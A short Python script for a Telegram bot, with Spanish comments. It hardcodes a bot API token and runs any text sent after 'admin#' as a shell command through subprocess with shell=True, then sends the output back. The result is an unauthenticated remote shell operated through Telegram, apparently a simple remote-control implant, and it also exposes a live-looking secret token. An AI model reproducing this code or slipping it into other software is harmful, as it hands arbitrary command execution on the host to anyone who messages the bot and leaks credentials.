from telegram.ext import * 
import subprocess
API_KEY = '1918913335:AAF5AQ8CS7WKzOlUb26FwaVv3ao5HxepntA' # IMPORTANTE, LA API DEBE SER LA DEL BOT.

def ejecutar(comando):
    #output = subprocess.call(comando, shell=True)
    result = subprocess.check_output(comando, shell=True)
    return result

def sample_responses(input_text):
    user_message = str(input_text).lower().split('#')

    if user_message[0] == ("admin"):
        return ejecutar(user_message[1])   #   broadcast

    if user_message[0] == ("broadcast"):
        return "Estoy operativo!"

    return "Error en la sentencia."


def handle_message(update, context):
    text = str(update.message.text).lower()
    response = str(sample_responses(text))
    update.message.reply_text(response)
def error(update, context):
    print(f"Update {update} caused error {context.error}")
def main():
    updater = Updater(API_KEY, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(MessageHandler(Filters.text, handle_message))
    dp.add_error_handler(error)
    updater.start_polling()
    updater.idle()
main()
